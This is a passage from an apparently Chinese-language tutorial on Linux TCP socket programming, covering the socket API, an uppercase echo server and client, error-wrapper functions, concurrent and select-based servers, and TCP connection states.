表示使用默认协议。返回值： 成功：返回指向新创建的socket的文件描述符，失败：返回-1，设置errno socket()打开一个网络通讯端口，如果成功的话，就像open()一样返回一个文件描述符，应用程序可以像读写文件一样用read/write在网络上收发数据，如果socket()调用出错则返回-1。对于IPv4，domain参数指定为AF_INET。对于TCP协议，type参数指定为SOCK_STREAM，表示面向流的传输协议。如果是UDP协议，则type参数指定为SOCK_DGRAM，表示面向数据报的传输协议。protocol参数的介绍从略，指定为0即可。 bind函数 1234567891011#include &lt;sys/types.h&gt; /* See NOTES */#include &lt;sys/socket.h&gt;int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);sockfd： socket文件描述符addr: 构造出IP地址加端口号addrlen: sizeof(addr)长度返回值： 成功返回0，失败返回-1, 设置errno 服务器程序所监听的网络地址和端口号通常是固定不变的，客户端程序得知服务器程序的地址和端口号后就可以向服务器发起连接，因此服务器需要调用bind绑定一个固定的网络地址和端口号。 bind()的作用是将参数sockfd和addr绑定在一起，使sockfd这个用于网络通讯的文件描述符监听addr所描述的地址和端口号。前面讲过，struct sockaddr *是一个通用指针类型，addr参数实际上可以接受多种协议的sockaddr结构体，而它们的长度各不相同，所以需要第三个参数addrlen指定结构体的长度。如： 12345struct sockaddr_in servaddr;bzero(&amp;servaddr, sizeof(servaddr));servaddr.sin_family = AF_INET;servaddr.sin_addr.s_addr = htonl(INADDR_ANY);servaddr.sin_port = htons(6666); 首先将整个结构体清零，然后设置地址类型为AF_INET，网络地址为INADDR_ANY，这个宏表示本地的任意IP地址，因为服务器可能有多个网卡，每个网卡也可能绑定多个IP地址，这样设置可以在所有的IP地址上监听，直到与某个客户端建立了连接时才确定下来到底用哪个IP地址，端口号为6666。 listen函数 表示最多同时能有多少客户端连接 1234567#include &lt;sys/types.h&gt; /* See NOTES */#include &lt;sys/socket.h&gt;int listen(int sockfd, int backlog);sockfd: socket文件描述符backlog: 排队建立3次握手队列和刚刚建立3次握手队列的链接数和 查看系统默认backlog 1cat /proc/sys/net/ipv4/tcp_max_syn_backlog 典型的服务器程序可以同时服务于多个客户端，当有客户端发起连接时，服务器调用的accept()返回并接受这个连接，如果有大量的客户端发起连接而服务器来不及处理，尚未accept的客户端就处于连接等待状态，listen()声明sockfd处于监听状态，并且最多允许有backlog个客户端处于连接待状态，如果接收到更多的连接请求就忽略。listen()成功返回0，失败返回-1。 accept函数 1234567891011#include &lt;sys/types.h&gt; /* See NOTES */#include &lt;sys/socket.h&gt;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);sockdf: socket文件描述符addr: 传出参数，返回链接客户端地址信息，含IP地址和端口号addrlen: 传入传出参数（值-结果）,传入sizeof(addr)大小，函数返回时返回真正接收到地址结构体的大小返回值： 成功返回一个新的socket文件描述符，用于和客户端通信，失败返回-1，设置errno 三方握手完成后，服务器调用accept()接受连接，如果服务器调用accept()时还没有客户端的连接请求，就阻塞等待直到有客户端连接上来。addr是一个传出参数，accept()返回时传出客户端的地址和端口号。addrlen参数是一个传入传出参数（value-result argument），传入的是调用者提供的缓冲区addr的长度以避免缓冲区溢出问题，传出的是客户端地址结构体的实际长度（有可能没有占满调用者提供的缓冲区）。如果给addr参数传NULL，表示不关心客户端的地址。 我们的服务器程序结构是这样的： 1234567while (1) &#123; cliaddr_len = sizeof(cliaddr); connfd = accept(listenfd, (struct sockaddr *)&amp;cliaddr, &amp;cliaddr_len); n = read(connfd, buf, MAXLINE); ...... close(connfd);&#125; 整个是一个while死循环，每次循环处理一个客户端连接。由于cliaddr_len是传入传出参数，每次调用accept()之前应该重新赋初值。accept()的参数listenfd是先前的监听文件描述符，而accept()的返回值是另外一个文件描述符connfd，之后与客户端之间就通过这个connfd通讯，最后关闭connfd断开连接，而不关闭listenfd，再次回到循环开头listenfd仍然用作accept的参数。accept()成功返回一个文件描述符，出错返回-1。 connect函数 1234567891011#include &lt;sys/types.h&gt; /* See NOTES */#include &lt;sys/socket.h&gt;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);sockdf: socket文件描述符addr: 传入参数，指定服务器端地址信息，含IP地址和端口号addrlen: 传入参数,传入sizeof(addr)大小返回值： 成功返回0，失败返回-1，设置errno C/S模型-TCP 下图是基于TCP协议的客户端/服务器程序的一般流程： 服务器调用socket()、bind()、listen()完成初始化后，调用accept()阻塞等待，处于监听端口的状态，客户端调用socket()初始化后，调用connect()发出SYN段并阻塞等待服务器应答，服务器应答一个SYN-ACK段，客户端收到后从connect()返回，同时应答一个ACK段，服务器收到后从accept()返回。 数据传输的过程： 建立连接后，TCP协议提供全双工的通信服务，但是一般的客户端/服务器程序的流程是由客户端主动发起请求，服务器被动处理请求，一问一答的方式。因此，服务器从accept()返回后立刻调用read()，读socket就像读管道一样，如果没有数据到达就阻塞等待，这时客户端调用write()发送请求给服务器，服务器收到后从read()返回，对客户端的请求进行处理，在此期间客户端调用read()阻塞等待服务器的应答，服务器调用write()将处理结果发回给客户端，再次调用read()阻塞等待下一条请求，客户端收到后从read()返回，发送下一条请求，如此循环下去。 如果客户端没有更多的请求了，就调用close()关闭连接，就像写端关闭的管道一样，服务器的read()返回0，这样服务器就知道客户端关闭了连接，也调用close()关闭连接。注意，任何一方调用close()后，连接的两个传输方向都关闭，不能再发送数据了。如果一方调用shutdown()则连接处于半关闭状态，仍可接收对方发来的数据。 在学习socket API时要注意应用程序和TCP协议层是如何交互的： 应用程序调用某个socket函数时TCP协议层完成什么动作，比如调用connect()会发出SYN段 应用程序如何知道TCP协议层的状态变化，比如从某个阻塞的socket函数返回就表明TCP协议收到了某些段，再比如read()返回0就表明收到了FIN段 nc命令 简单的客户端程序 123nc ip地址 端口号nc 127.0.0.1 6666nc 127.1 6666 bzero函数 1234567//要包含的头文件#include &lt;string.h&gt;// 作用: 把缓冲区逐字节清零void bzero(void *s, size_t n);void *s //指定缓冲区size_t n //指定缓冲取大小 server实现 作用是从客户端读字符，然后将每个字符转换为大写并回送给客户端。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdlib.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;ctype.h&gt;#define SERV_IP \"127.0.0.1\"#define SERV_PORT 6666int main(void)&#123; int lfd, cfd; struct sockaddr_in serv_addr, clie_addr; socklen_t clie_addr_len; char buf[BUFSIZ],CLIE_IP[BUFZIZ]; int n, i; lfd = socket(AF_INET, SOCK_STREAM, 0); serv_addr.sin_family = AF_INET; serv_addr.sin_port = htons(SERV_PORT); serv_addr.sin_addr.s_addr = htonl(INADDR_ANY); bind(lfd, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr)); listen(lfd, 128); clie_addr_len = sizeof(clie_addr); cfd = accept(lfd, (struct sockaddr *)&amp;clie_addr, &amp;clie_addr_len); printf(\"client IP: %s port:%d\\n\", inet_ntop(AF_INET, &amp;clie_addr.sin_addr.s_addr, clie_IP, sizeof(clie_IP)), ntohs(clie_addr.sin_port)); while (1) &#123; n = read(cfd, buf, sizeof(buf)); for (i = 0; i &lt; n; i++) buf[i] = toupper(buf[i]); write(cfd, buf, n); &#125; close(lfd); close(cfd); return 0;&#125; client客户端实现 作用:客户端输入英文小写字符串,并发送给服务端,然后服务端回一串对应的大写英文字符串,最后输出到终端 如果客户端不绑定端口和ip，操作系统会隐式的帮客户端绑定地址和端口 123man 7 ip //查看struct sockaddr_in 结构体gets函数最好不要使用,因为已经过时了,使用fgets来代替gets 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#define SERV_IP \"127.0.0.1\"#define SERV_PORT 9527int main(void)&#123; int sfd, len; struct sockaddr_in serv_addr; char buf[BUFSIZ]; /*创建一个socket 指定IPv4 TCP*/ sfd = socket(AF_INET, SOCK_STREAM, 0); /*初始化一个地址结构:*/ bzero(&amp;serv_addr, sizeof(serv_addr)); //清零 serv_addr.sin_family = AF_INET; //IPv4协议族 inet_pton(AF_INET, SERV_IP, &amp;serv_addr.sin_addr.s_addr); //指定IP 字符串类型转换为网络字节序 参3:传出参数 serv_addr.sin_port = htons(SERV_PORT); //指定端口 本地转网络字节序 /*根据地址结构链接指定服务器进程*/ connect(sfd, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr)); while (1) &#123; /*从标准输入获取数据*/ fgets(buf, sizeof(buf), stdin); /*将数据写给服务器*/ write(sfd, buf, strlen(buf)); //写个服务器 /*从服务器读回转换后数据*/ len = read(sfd, buf, sizeof(buf)); /*写至标准输出*/ write(STDOUT_FILENO, buf, len); &#125; /*关闭链接*/ close(sfd); return 0;&#125; 客户端服务器程序分析 客户端和服务器端的cfd文件描述符各自指向两个缓冲区一个是读缓冲区另一个是写缓冲区 他们是通过IP地址+端口号进行建立连接的 一个文件描述符读的同时也可以写,所以是双向全双工的 客户端输入hello然后通过cfd写入发送缓冲区里，然后发送给服务器端的cfd接收缓冲区，服务器端收到hello后将其转换为HELLO后，将其写入发送缓冲区，然后发送给客户端的接收缓冲区，客户端收到后显示到终端 如果cfd只有一个缓冲区，就只能接收或发送，如果缓冲区是负责接收的，那么就不能发送，相反同上。所以cfd一定是两个缓冲区进行工作的。 服务器端或客户端的read如果没有接收到消息，一定是阻塞的，直到缓冲区收到内容才进行工作。 查看网络程序端口 1netstat -apn | grep 端口号 错误处理函数 帮助文档查看函数名的时候是不区分大小写的 wrap.h 123456789101112131415161718#ifndef __WRAP_H_#define __WRAP_H_void perr_exit(const char *s);int Accept(int fd, struct sockaddr *sa, socklen_t *salenptr);int Bind(int fd, const struct sockaddr *sa, socklen_t salen);int Connect(int fd, const struct sockaddr *sa, socklen_t salen);int Listen(int fd, int backlog);int Socket(int family, int type, int protocol);ssize_t Read(int fd, void *ptr, size_t nbytes);ssize_t Write(int fd, const void *ptr, size_t nbytes);int Close(int fd);ssize_t Readn(int fd, void *vptr, size_t n);ssize_t Writen(int fd, const void *vptr, size_t n);ssize_t my_read(int fd, char *ptr);ssize_t Readline(int fd, void *vptr, size_t maxlen);#endif wrap.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;sys/socket.h&gt;void perr_exit(const char *s)&#123; perror(s); exit(-1);&#125;int Accept(int fd, struct sockaddr *sa, socklen_t *salenptr)&#123; int n;again: if ((n = accept(fd, sa, salenptr)) &lt; 0) &#123; if ((errno == ECONNABORTED) || (errno == EINTR)) goto again; else perr_exit(\"accept error\"); &#125; return n;&#125;int Bind(int fd, const struct sockaddr *sa, socklen_t salen)&#123; int n; if ((n = bind(fd, sa, salen)) &lt; 0) perr_exit(\"bind error\"); return n;&#125;int Connect(int fd, const struct sockaddr *sa, socklen_t salen)&#123; int n; n = connect(fd, sa, salen); if (n &lt; 0) &#123; perr_exit(\"connect error\"); &#125; return n;&#125;int Listen(int fd, int backlog)&#123; int n; if ((n = listen(fd, backlog)) &lt; 0) perr_exit(\"listen error\"); return n;&#125;int Socket(int family, int type, int protocol)&#123; int n; if ((n = socket(family, type, protocol)) &lt; 0) perr_exit(\"socket error\"); return n;&#125;ssize_t Read(int fd, void *ptr, size_t nbytes)&#123; ssize_t n;again: if ( (n = read(fd, ptr, nbytes)) == -1) &#123; if (errno == EINTR) goto again; else return -1; &#125; return n;&#125;ssize_t Write(int fd, const void *ptr, size_t nbytes)&#123; ssize_t n;again: if ((n = write(fd, ptr, nbytes)) == -1) &#123; if (errno == EINTR) goto again; else return -1; &#125; return n;&#125;int Close(int fd)&#123; int n; if ((n = close(fd)) == -1) perr_exit(\"close error\"); return n;&#125;/*参三: 应该读取的字节数*/ //socket 4096 readn(cfd, buf, 4096) nleft = 4096-1500//读n个字节ssize_t Readn(int fd, void *vptr, size_t n)&#123; size_t nleft; //usigned int 剩余未读取的字节数 ssize_t nread; //int 实际读到的字节数 char *ptr; ptr = vptr; nleft = n; //n 未读取字节数 while (nleft &gt; 0) &#123; if ((nread = read(fd, ptr, nleft)) &lt; 0) &#123; if (errno == EINTR) nread = 0; else return -1; &#125; else if (nread == 0) break; nleft -= nread; //nleft = nleft - nread ptr += nread; &#125; return n - nleft;&#125;//写n个字节ssize_t Writen(int fd, const void *vptr, size_t n)&#123; size_t nleft; ssize_t nwritten; const char *ptr; ptr = vptr; nleft = n; while (nleft &gt; 0) &#123; if ( (nwritten = write(fd, ptr, nleft)) &lt;= 0) &#123; if (nwritten &lt; 0 &amp;&amp; errno == EINTR) nwritten = 0; else return -1; &#125; nleft -= nwritten; ptr += nwritten; &#125; return n;&#125;//一次读100个字节static ssize_t my_read(int fd, char *ptr)&#123; static int read_cnt; static char *read_ptr; static char read_buf[100]; if (read_cnt &lt;= 0) &#123;again: if ( (read_cnt = read(fd, read_buf, sizeof(read_buf))) &lt; 0) &#123; //\"hello\\n\" if (errno == EINTR) goto again; return -1; &#125; else if (read_cnt == 0) return 0; read_ptr = read_buf; &#125; read_cnt--; *ptr = *read_ptr++; return 1;&#125;/*readline --- fgets*/ //传出参数 vptr// 作用：读一行ssize_t Readline(int fd, void *vptr, size_t maxlen)&#123; ssize_t n, rc; char c, *ptr; ptr = vptr; for (n = 1; n &lt; maxlen; n++) &#123; if ((rc = my_read(fd, &amp;c)) == 1) &#123; //ptr[] = hello\\n *ptr++ = c; if (c == '\\n') break; &#125; else if (rc == 0) &#123; *ptr = 0; return n-1; &#125; else return -1; &#125; *ptr = 0; return n;&#125; read函数返回值 12345678char buf[1024];&gt;0 实际读到的字节数,可以等于buf或小于buf=0 对端关闭=-1 异常 1. errno == EINTR 被信号中断 可以进行重启或退出处理 2. errno == EAGAIN (EWOULDBLOCK) 非阻塞方式读，并且没有数据 3. 其他值 出现错误。--perror 打印错误信息 ,exit 退出程序。 TCP三次握手和四次挥手 1234567891011121314151617181920TCP三次握手客户端: 发送SYN包 1(0) 括号0代表这个数据包带0字节数据服务端: 收到后做应答 2000(0) ACK 2 ACK是应答客户端发送的SYN包号+1客户端: 收到服务端的包后做出应答 ACK 2001TCP四次挥手客户端: 发送FIN包 2(0) ACK 2001服务端; 收到后回一个ACK包 ACK 3这时候TCP属于半关闭状态服务端: 发送FIN包 FIN 2001(0) ACK 3客户端: 发送ACK包 ACK 2002MTU、mss、半关闭 MTU： 最大传输单元 受协议限制 以太网1500 IP 65535 mss： 受MTU 标示一个数据包携带数据的上限数。 win： 滑动窗口——当前本端 能接收的数据上限值。(单位：字节) 使用TCP建立连接的机器,如果机器A发送数据包给机器B，机器B没有收到的话，机器A会重新发送一次 协议上限分析 多进程并发服务器程序实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;signal.h&gt;#include &lt;sys/wait.h&gt;#include &lt;ctype.h&gt;#include &lt;unistd.h&gt;#include \"wrap.h\"#define MAXLINE 8192#define SERV_PORT 8000void do_sigchild(int num)&#123; while (waitpid(0, NULL, WNOHANG) &gt; 0) ;&#125;int main(void)&#123; struct sockaddr_in servaddr, cliaddr; socklen_t cliaddr_len; int listenfd, connfd; char buf[MAXLINE]; char str[INET_ADDRSTRLEN]; int i, n; pid_t pid; struct sigaction newact; newact.sa_handler = do_sigchild; sigemptyset(&amp;newact.sa_mask); newact.sa_flags = 0; sigaction(SIGCHLD, &amp;newact, NULL); listenfd = Socket(AF_INET, SOCK_STREAM, 0); int opt = 1; setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &amp;opt, sizeof(opt)); bzero(&amp;servaddr, sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl(INADDR_ANY); servaddr.sin_port = htons(SERV_PORT); Bind(listenfd, (struct sockaddr *)&amp;servaddr, sizeof(servaddr)); Listen(listenfd, 20); printf(\"Accepting connections ...\\n\"); while (1) &#123; cliaddr_len = sizeof(cliaddr); connfd = Accept(listenfd, (struct sockaddr *)&amp;cliaddr, &amp;cliaddr_len); pid = fork(); //子进程工作 if (pid == 0) &#123; Close(listenfd); while (1) &#123; n = Read(connfd, buf, MAXLINE); if (n == 0) &#123; printf(\"the other side has been closed.\\n\"); break; &#125; printf(\"received from %s at PORT %d\\n\", inet_ntop(AF_INET, &amp;cliaddr.sin_addr, str, sizeof(str)), ntohs(cliaddr.sin_port)); for (i = 0; i &lt; n; i++) buf[i] = toupper(buf[i]); Write(STDOUT_FILENO, buf, n); Write(connfd, buf, n); &#125; Close(connfd); return 0; &#125; else if (pid &gt; 0) &#123; Close(connfd); &#125; else perr_exit(\"fork\"); &#125; return 0;&#125; 多线程并发服务器程序实现 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;pthread.h&gt;#include &lt;ctype.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include \"wrap.h\"#define MAXLINE 8192#define SERV_PORT 8000struct s_info &#123; //定义一个结构体, 将地址结构跟cfd捆绑 struct sockaddr_in cliaddr; int connfd;&#125;;void *do_work(void *arg)&#123; int n,i; struct s_info *ts = (struct s_info*)arg; char buf[MAXLINE]; char str[INET_ADDRSTRLEN]; //#define INET_ADDRSTRLEN 16 可用\"[+d\"查看 while (1) &#123; n = Read(ts-&gt;connfd, buf, MAXLINE); //读客户端 if (n == 0) &#123; printf(\"the client %d closed...\\n\", ts-&gt;connfd); break; //跳出循环,关闭cfd &#125; printf(\"received from %s at PORT %d\\n\", inet_ntop(AF_INET, &amp;(*ts).cliaddr.sin_addr, str, sizeof(str)), ntohs((*ts).cliaddr.sin_port)); //打印客户端信息(IP/PORT) for (i = 0; i &lt; n; i++) buf[i] = toupper(buf[i]); //小写--&gt;大写 Write(STDOUT_FILENO, buf, n); //写出至屏幕 Write(ts-&gt;connfd, buf, n); //回写给客户端 &#125; Close(ts-&gt;connfd); return (void *)0;&#125;int main(void)&#123; struct sockaddr_in servaddr, cliaddr; socklen_t cliaddr_len; int listenfd, connfd; pthread_t tid; struct s_info ts[256]; //根据最大线程数创建结构体数组. int i = 0; listenfd = Socket(AF_INET, SOCK_STREAM, 0); //创建一个socket, 得到lfd bzero(&amp;servaddr, sizeof(servaddr)); //地址结构清零 servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl(INADDR_ANY); //指定本地任意IP servaddr.sin_port = htons(SERV_PORT); //指定端口号 8000 Bind(listenfd, (struct sockaddr *)&amp;servaddr, sizeof(servaddr)); //绑定 Listen(listenfd, 128); //设置同一时刻链接服务器上限数 printf(\"Accepting client connect ...\\n\"); while (1) &#123; cliaddr_len = sizeof(cliaddr); connfd = Accept(listenfd, (struct sockaddr *)&amp;cliaddr, &amp;cliaddr_len); //阻塞监听客户端链接请求 ts[i].cliaddr = cliaddr; ts[i].connfd = connfd; /* 达到线程最大数时，pthread_create出错处理, 增加服务器稳定性 */ pthread_create(&amp;tid, NULL, do_work, (void*)&amp;ts[i]); pthread_detach(tid); //子线程分离,防止僵线程产生. i++; &#125; return 0;&#125; TCP状态转换 RST标志位表示客户端异常断开,服务端无法接收ACK,所以客户端操作系统会发送一个RST标志,然后让服务端回到LISTEN状态,重新接收连接 2MSL在linux中是 TIME_WAIT状态是确保主动关闭端发送的最后一个ACK能顺利到达 CLOSED：表示初始状态。 LISTEN：该状态表示服务器端的某个SOCKET处于监听状态，可以接受连接。 SYN_SENT：这个状态与SYN_RCVD遥相呼应，当客户端SOCKET执行CONNECT连接时，它首先发送SYN报文，随即进入到了SYN_SENT状态，并等待服务端的发送三次握手中的第2个报文。SYN_SENT状态表示客户端已发送SYN报文。 SYN_RCVD: 该状态表示接收到SYN报文，在正常情况下，这个状态是服务器端的SOCKET在建立TCP连接时的三次握手会话过程中的一个中间状态，很短暂。此种状态时，当收到客户端的ACK报文后，会进入到ESTABLISHED状态。 ESTABLISHED：表示连接已经建立。 FIN_WAIT_1: FIN_WAIT_1和FIN_WAIT_2状态的真正含义都是表示等待对方的FIN报文。区别是： FIN_WAIT_1状态是当socket在ESTABLISHED状态时，想主动关闭连接，向对方发送了FIN报文，此时该socket进入到FIN_WAIT_1状态。 FIN_WAIT_2状态是当对方回应ACK后，该socket进入到FIN_WAIT_2状态，正常情况下，对方应马上回应ACK报文，所以FIN_WAIT_1状态一般较难见到，而FIN_WAIT_2状态可用netstat看到。 FIN_WAIT_2：主动关闭链接的一方，发出FIN收到ACK以后进入该状态。称之为半连接或半关闭状态。该状态下的socket只能接收数据，不能发。 TIME_WAIT:表示收到了对方的FIN报文，并发送出了ACK报文，等2MSL后即可回到CLOSED可用状态。如果FIN_WAIT_1状态下，收到对方同时带 FIN标志和ACK标志的报文时，可以直接进入到TIME_WAIT状态，而无须经过FIN_WAIT_2状态。 CLOSING: 这种状态较特殊，属于一种较罕见的状态。正常情况下，当你发送FIN报文后，按理来说是应该先收到（或同时收到）对方的 ACK报文，再收到对方的FIN报文。但是CLOSING状态表示你发送FIN报文后，并没有收到对方的ACK报文，反而却也收到了对方的FIN报文。什么情况下会出现此种情况呢？如果双方几乎在同时close一个SOCKET的话，那么就出现了双方同时发送FIN报文的情况，也即会出现CLOSING状态，表示双方都正在关闭SOCKET连接。 CLOSE_WAIT: 此种状态表示在等待关闭。当对方关闭一个SOCKET后发送FIN报文给自己，系统会回应一个ACK报文给对方，此时则进入到CLOSE_WAIT状态。接下来呢，察看是否还有数据发送给对方，如果没有可以 close这个SOCKET，发送FIN报文给对方，即关闭连接。所以在CLOSE_WAIT状态下，需要关闭连接。 LAST_ACK:该状态是被动关闭一方在发送FIN报文后，最后等待对方的ACK报文。当收到ACK报文后，即可以进入到CLOSED可用状态。 2MSL 2MSL (Maximum Segment Lifetime) RFC 793中规定MSL为2分钟，实际应用中常用的是30秒，1分钟和2分钟等。 程序设计中的问题 做一个测试，首先启动server，然后启动client，用Ctrl-C终止server，马上再运行server，运行结果： 12itcast$ ./serverbind error: Address already in use 这是因为，虽然server的应用程序终止了，但TCP协议层的连接并没有完全断开，因此不能再次监听同样的server端口。我们用netstat命令查看一下： 123itcast$ netstat -apn |grep 6666tcp 1 0 192.168.1.11:38103 192.168.1.11:6666 CLOSE_WAIT 3525/client tcp 0 0 192.168.1.11:6666 192.168.1.11:38103 FIN_WAIT2 - server终止时，socket描述符会自动关闭并发FIN段给client，client收到FIN后处于CLOSE_WAIT状态，但是client并没有终止，也没有关闭socket描述符，因此不会发FIN给server，因此server的TCP连接处于FIN_WAIT2状态。 现在用Ctrl-C把client也终止掉，再观察现象： 1234itcast$ netstat -apn |grep 6666tcp 0 0 192.168.1.11:6666 192.168.1.11:38104 TIME_WAIT -itcast$ ./serverbind error: Address already in use client终止时自动关闭socket描述符，server的TCP连接收到client发的FIN段后处于TIME_WAIT状态。TCP协议规定，主动关闭连接的一方要处于TIME_WAIT状态，等待两个MSL（maximum segment lifetime）的时间后才能回到CLOSED状态，因为我们先Ctrl-C终止了server，所以server是主动关闭连接的一方，在TIME_WAIT期间仍然不能再次监听同样的server端口。 MSL在RFC 1122中规定为两分钟，但是各操作系统的实现不同，在Linux上一般经过半分钟后就可以再次启动server了。至于为什么要规定TIME_WAIT的时间，可参考UNP 2.7节。 半关闭 当TCP链接中A发送FIN请求关闭，B端回应ACK后（A端进入FIN_WAIT_2状态），B没有立即发送FIN给A时，A方处在半链接状态，此时A可以接收B发送的数据，但是A已不能再向B发送数据。 从程序的角度，可以使用API来控制实现半连接状态。 12345678#include &lt;sys/socket.h&gt;int shutdown(int sockfd, int how);sockfd: 需要关闭的socket的描述符how: 允许为shutdown操作选择以下几种方式: SHUT_RD(0)： 关闭sockfd上的读功能，此选项将不允许sockfd进行读操作。 该套接字不再接受数据，任何当前在套接字接受缓冲区的数据将被无声的丢弃掉。 SHUT_WR(1): 关闭sockfd的写功能，此选项将不允许sockfd进行写操作。进程不能在对此套接字发出写操作。 SHUT_RDWR(2): 关闭sockfd的读写功能。相当于调用shutdown两次：首先是以SHUT_RD,然后以SHUT_WR。 使用close中止一个连接，但它只是减少描述符的引用计数，并不直接关闭连接，只有当描述符的引用计数为0时才关闭连接。 shutdown不考虑描述符的引用计数，直接关闭描述符。也可选择中止一个方向的连接，只中止读或只中止写。 注意: 如果有多个进程共享一个套接字，close每被调用一次，计数减1，直到计数为0时，也就是所用进程都调用了close，套接字将被释放。 在多进程中如果一个进程调用了shutdown(sfd, SHUT_RDWR)后，其它的进程将无法进行通信。但，如果一个进程close(sfd)将不会影响到其它进程。 端口复用 在server的TCP连接没有完全断开之前不允许重新监听是不合理的。因为，TCP连接没有完全断开指的是connfd（127.0.0.1:6666）没有完全断开，而我们重新监听的是lis-tenfd（0.0.0.0:6666），虽然是占用同一个端口，但IP地址不同，connfd对应的是与某个客户端通讯的一个具体的IP地址，而listenfd对应的是wildcard address。解决这个问题的方法是使用setsockopt()设置socket描述符的选项SO_REUSEADDR为1，表示允许创建端口号相同但IP地址不同的多个socket描述符。 在server代码的socket()和bind()调用之间插入如下代码： 12int opt = 1;setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &amp;opt, sizeof(opt)); 有关setsockopt可以设置的其它选项请参考UNP第7章。 多路I/O转接服务器 多路IO转接服务器也叫做多任务IO服务器。该类服务器实现的主旨思想是，不再由应用程序自己监视客户端连接，取而代之由内核替应用程序监视文件。 主要使用的方法有三种 select select能监听的文件描述符个数受限于FD_SETSIZE,一般为1024，单纯改变进程打开的文件描述符个数并不能改变select监听文件个数 解决1024以下客户端时使用select是很合适的，但如果链接客户端过多，select采用的是轮询模型，会大大降低服务器响应效率，不应在select上投入更多精力 如果要修改文件描述符上限需要重新编译内核 如果有两个文件描述符,一个是1号文件描述符另一个是1023号文件描述符触发了读事件,则需要for循环遍历1023次才能找到对应的两个事件,解决办法是创建一个数组来保存文件描述符,防止多余的遍历 满足监听条件的集合和原有集合都是同一个集合,所有要提前保存好原有集合,防止数据被覆盖 123456789101112131415161718192021222324#include &lt;sys/select.h&gt;/* According to earlier standards */#include &lt;sys/time.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;int select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout); nfds: 监控的文件描述符集里最大文件描述符加1，因为此参数会告诉内核检测前多少个文件描述符的状态 readfds： 监控有读数据到达文件描述符集合，传入传出参数 writefds： 监控写数据到达文件描述符集合，传入传出参数 exceptfds： 监控异常发生达文件描述符集合,如带外数据到达异常，传入传出参数 timeout： 定时阻塞监控时间，3种情况 1.NULL，永远等下去 2.设置timeval，等待固定时间 3.设置timeval里时间均为0，检查描述字后立即返回，轮询 struct timeval &#123; long tv_sec; /* seconds */ long tv_usec; /* microseconds */ &#125;; void FD_CLR(int fd, fd_set *set); //把文件描述符集合里fd清0 int FD_ISSET(int fd, fd_set *set); //测试文件描述符集合里fd是否置1 void FD_SET(int fd, fd_set *set); //把文件描述符集合里fd位置1 void FD_ZERO(fd_set *set); //把文件描述符集合里所有位清0 select实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;ctype.h&gt;#include \"wrap.h\"#define SERV_PORT 6666int main(int argc, char *argv[])&#123; int i, j, n, maxi; int nready, client[FD_SETSIZE]; /* 自定义数组client, 防止遍历1024个文件描述符 FD_SETSIZE默认为1024 */ int maxfd, listenfd, connfd, sockfd; char buf[BUFSIZ], str[INET_ADDRSTRLEN]; /* #define INET_ADDRSTRLEN 16 */ //存放服务器和客户端的ip和端口 struct sockaddr_in clie_addr, serv_addr; //客户端clie_addr的长度 socklen_t clie_addr_len; fd_set rset, allset; /* rset 读事件文件描述符集合 allset用来暂存 */ //创建套接字 listenfd = Socket(AF_INET, SOCK_STREAM, 0); //设置端口复用 int opt = 1; setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &amp;opt, sizeof(opt)); //清空serv_addr bzero(&amp;serv_addr, sizeof(serv_addr)); //设置服务器端口和ip serv_addr.sin_family= AF_INET; serv_addr.sin_addr.s_addr = htonl(INADDR_ANY); serv_addr.sin_port= htons(SERV_PORT); //绑定端口和ip Bind(listenfd, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr)); //设置监听 Listen(listenfd, 128); maxfd = listenfd; /* 起初 listenfd 即为最大文件描述符 */ maxi = -1; /* 将来用作client[]的下标, 初始值指向0个元素之前下标位置 */ for (i = 0; i &lt; FD_SETSIZE; i++) client[i] = -1; /* 用-1初始化client[] */ FD_ZERO(&amp;allset); FD_SET(listenfd, &amp;allset); /* 构造select监控文件描述符集 */ while (1) &#123; rset = allset; /* 每次循环时都从新设置select监控信号集 */ nready = select(maxfd+1, &amp;rset, NULL, NULL, NULL); if (nready &lt; 0) perr_exit(\"select error\"); if (FD_ISSET(listenfd, &amp;rset)) &#123; /* 说明有新的客户端链接请求 */ clie_addr_len = sizeof(clie_addr); connfd = Accept(listenfd, (struct sockaddr *)&amp;clie_addr, 